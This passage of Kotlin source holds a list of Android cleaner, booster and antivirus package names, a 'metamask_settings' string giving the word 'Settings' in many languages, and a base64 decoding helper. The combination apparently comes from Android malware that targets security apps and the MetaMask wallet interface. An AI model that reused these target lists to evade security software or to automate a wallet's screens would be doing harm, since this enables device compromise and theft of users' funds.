        "com.transsion.phonemaster",
        "huera.cpu.cleaner",
        "com.sup.phone.cleaner.booster.app",
        "com.qcleaner",
        "redpi.apps.quickcleanfree",
        "com.kosajun.easymemorycleaner",
        "com.cacheclean.cleanapp.cacheappclean",
        "com.qihoo.security",
        "com.qihoo.security.lite",
        "com.maxdevlab.cleaner.security",
        "com.tatkovlab.sdcardcleaner",
        "com.nepel.scandriveanti",
        "com.simplitec.simplitecapp",
        "com.rootuninstaller.rambooster",
        "com.rootuninstaller.ramboosterpro",
        "com.xtraszone.smartclean",
        "com.smartapps.cleanboost.cool.optimize",
        "com.studio.coolmaster.coolerapp.cooling",
        "org.spaceapp.cleaner",
        "com.appnextg.cleaner",
        "com.litetools.speed.booster",
        "advanced.speed.booster",
        "com.rvappstudios.speed_booster_junk_cleaner",
        "com.jaybox.cleaner.security",
        "com.cache.cleaner.cachecleaner.booster.storage",
        "com.egostudio.clean",
        "com.youtupu.superclean",
        "com.ludashi.security",
        "com.hermes.superb.oem",
        "com.huawei.hwid",
        "com.powerful.cleaner",
        "com.netqin.aotkiller",
        "system.optimizer",
        "com.topcleaner.booster",
        "com.totalcleanerlite.android",
        "com.totalsecurity.app",
        "com.securitydefend.totalvirusdefender",
        "phone.antivirus.virus.cleaner.junk.clean.speed.booster.master",
        "com.wf.wfbattery",
        "com.sbits.whatsappcleaner",
        "com.baloota.xcleaner",
        "com.zemana.msecurity",
        "com.appsinnova.android.battery",
        "fancyclean.cleaner.boost.privacy.antivirus.mini",
        "fancyclean.boost.antivirus.junkcleaner",
        "com.fancyclean.security.antivirus",
        "com.iclean.master.boost",
        "com.appsinnova.android.keepsecure",
        "com.noxgroup.app.cleaner",
        "fastcharger.cleanmaster.batterysaver.batterydoctor",
        "antivirus.anti.virus.cleaner.security.booster",
        "org.strong.booster.cleaner.fixer",
        "com.clean.booster.optimizer",
        "com.atvcleaner",
        "com.antivirus.cleaner.for.android.vpn.app.lock.bsafe",
        "com.radialapps.antivirus.battery.appbooster.cleaner",
        "ch.smalltech.battery.free",
        "com.macropinch.pearl",
        "com.fastcharger.profastcharging",
        "com.mobile_infographics_tools.mydrive",
        "com.avrilapp.appskiller",
        "com.androidrocker.taskkiller",
        "com.pextor.batterychargeralarm",
        "com.fulminesoftware.batteryindicator",
        "com.diezgames.battery",
        "com.luko.parallel.smart.manager.batterysaver.boost.optimizer.cleaner",
        "bazinga.historyclean",
        "com.bazinga.cacheclean",
        "cleaner.junk.booster.boost.clear.clean.cachecleaner.clearcache.cleancache.optimize.cache.allcleaner",
        "com.ruhax.cleandroid",
        "cache.optimize.cleancache.clearcache.cachecleaner.clean.clear.boost.booster.junk",
        "com.androidtools.miniantivirus",
        "com.phone.cache.superpowercleaner",
        "me.empirical.android.application.truerambooster",
        "com.cleanmyphone.cleanmyandroid.freeupspace",
        "com.alberto.cleaner.files.photos.clean",
        "fast.phone.clean",
        "com.zeroneapps.cachecleaner",
        "com.MSlaytter.ramzero",
        "com.empty.folder.cleaner.emptyfoldercleaner.removeemptyfolders",
        "com.mobikeeper.global",
        "com.geekslab.cleanboost",
        "supercleaner.phonecleaner.batterydoctor.fastcharging",
        "phone.cleaner.antivirus.speed.booster",
        "phonecooler.cpucooler.coolermaster.batterycooler",
        "com.phonecleaner.memorycleaner.fastcharging",
        "ddolcatmaster.mypowermanagement",
        "com.mobique.deleteapps",
        "proapp.booster.ram.memory",
        "com.booster.mobile.cache.cleanerfree",
        "com.booster.mobile.cache.cleanerpro",
        "com.cleamyandroid.booster.mobile",
        "com.goodapp.phonecleaner.booster",
        "com.toolapp.speedbooster.cleaner",
        "fast.cleaner.battery.saver.pro",
        "infomagicien.cleaner_phone",
        "sec.huawei.com"
    )

    val metamask_settings: String =
        "{" +
                "'en':'Settings'," +
                "'ar':'الإعدادات'," +
                "'bg':'Настройки'," +
                "'bn':'সেটিংস'," +
                "'de':'Einstellungen'," +
                "'el':'Ρυθμίσεις'," +
                "'es':'Ajustes'," +
                "'fa':'تنظیمات'," +
                "'fi':'Asetukset'," +
                "'fi':'Asetukset'," +
                "'fr':'Paramètres'," +
                "'hi':'सेटिंग्स'," +
                "'hu':'Beállítások'," +
                "'in':'Pengaturan'," +
                "'it':'Impostazioni'," +
                "'ja':'設定'," +
                "'mr':'सेटिंग्ज'," +
                "'ko':'설정'," +
                "'ms':'Tetapan'," +
                "'my':'ဆက္တင္'," +
                "'nl':'Instellingen'," +
                "'pa':'ਸੈਟਿੰਗ'," +
                "'pl':'Ustawienia'," +
                "'pt':'Definições'," +
                "'pt-rBR':'Configurações'," +
                "'ro':'Setări'," +
                "'ru':'Настройки'," +
                "'sr':'Podešavanja'," +
                "'th':'การตั้งค่า'," +
                "'tr':'Ayarlar'," +
                "'uk':'Налаштування'," +
                "'vi':'Cài đặt'," +
                "'zh-rCN':'设置'," +
                "'zh-rTW':'設定'," +
                "'zh':'設定'" +
                "}"

    fun base64Decode(str: String?): String {
        return try {
            val data = Base64.decode(str, Base64.DEFAULT)
            data.toString(Charset.forName("UTF-8"))
        } catch (ex: Exception) {
            ""
        }
    }
}
